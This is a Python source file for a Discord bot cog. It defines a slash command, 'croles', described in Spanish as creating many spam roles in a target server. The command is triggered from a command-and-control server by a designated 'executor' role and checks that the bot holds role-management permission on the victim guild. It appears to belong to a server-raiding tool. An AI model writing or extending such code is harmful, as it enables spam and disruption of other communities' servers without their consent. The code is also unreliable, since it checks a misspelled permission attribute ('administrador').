import nextcord
from nextcord.ext import commands, application_checks
from nextcord import Interaction, SlashOption

from config.config_handler import ConfigHandler
from middlewares.server_verification import ServerVerification
from components.modals.croles_model import CrolesModal
from utils.server_utils import ServerUtils

class Croles(commands.Cog):
    
    config_handler = ConfigHandler()
    verifications = ServerVerification()
    utils = ServerUtils()
    
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        
    @nextcord.slash_command(
        name = "croles",
        description = "Crea muchos roles de spam.",
        guild_ids = config_handler.get_CaC_server_id()
    )
    
    @application_checks.has_role(config_handler.get_executor_rol_id())
    async def croles_command(self, ctx: Interaction, 
                    id: str = SlashOption(required = True, description = "Id del servidor objtivo.")):
        
        guild = self.utils.get_server(int(id), self.bot)
        
        self.verifications.check_command_execution_in_allowed_server(guild.id)
        self.verifications.check_bag(guild)
        
        if (not guild.me.guild_permissions.manage_roles
            and not guild.me.guild_permissions.administrador):
            
            raise commands.BotMissingPermissions(["268435456"])
        
        modal = CrolesModal(guild)
        await ctx.response.send_modal(modal)
        
def setup(client):
    client.add_cog(Croles(client))